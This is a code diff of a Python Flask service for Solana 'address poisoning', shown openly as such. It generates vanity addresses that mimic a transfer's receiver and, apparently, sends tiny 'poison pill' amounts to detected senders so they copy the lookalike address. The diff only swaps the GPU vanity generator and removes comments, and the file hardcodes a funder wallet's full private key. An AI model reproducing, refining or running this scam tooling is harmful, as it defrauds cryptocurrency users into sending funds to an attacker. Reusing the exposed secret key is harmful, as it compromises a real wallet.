@@ -3,7 +3,7 @@ import os
 sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "vanitygenerator")))
 from soltransfer.sol_xfr import send_sol
 import time
-from vanitygenerator.persistent_generator import generate_similar_address_persistent
+from vanitygenerator.generatekeys import generate_similar_address
 import base58
 import json
 import logging
@@ -14,10 +14,6 @@ from solders.pubkey import Pubkey
 # Flask imports
 from flask import Flask, request, jsonify
 
-# NOTE: Using persistent GPU vanity generator to avoid GPU/OpenCL reinitialization
-# The GPU context is kept alive for 20 minutes (configurable) and reused across
-# multiple vanity address generation requests, significantly improving performance
-
 funderpubkey = "RAPEWkHm8YZJ6ECeaasbJdUp7E3XsxVYvLvHqCPSbT1"
 funderprivkey = "2YVpmDaVDv1tMEREMUSPVL4io6WKJ2yvKZdoaJTRF36qv7Knd8jARhN9Qs3o65nUbJHLRzwdXaR37GqMVjpxjDZ5"
 rpc_url = "http://frankfurt.rpc.pinnaclenode.com"
@@ -26,10 +22,6 @@ poison_pill = 0.00001
 min_gas = 0.000005000
 cu_prc   = 0
 cu_lmt   = 250000
-
-# GPU context timeout in seconds (1.5 minutes = 90 seconds)
-# The GPU context will be kept alive for this duration and reused
-gpu_context_timeout = 90
 
 gpu_lock = threading.Lock()
 
@@ -50,7 +42,7 @@ def safe_send_sol(*args, **kwargs):
 
 def poison(detectedsender, detectedreceiver):
     with gpu_lock:
-        similar_address = generate_similar_address_persistent(detectedreceiver)
+        similar_address = generate_similar_address(detectedreceiver)
         print(f"Generated address: {similar_address} to poison {detectedsender} who sent funds to {detectedreceiver}")
         with open("generated_wallets.jsonl", "a") as f:
             json.dump(similar_address, f)
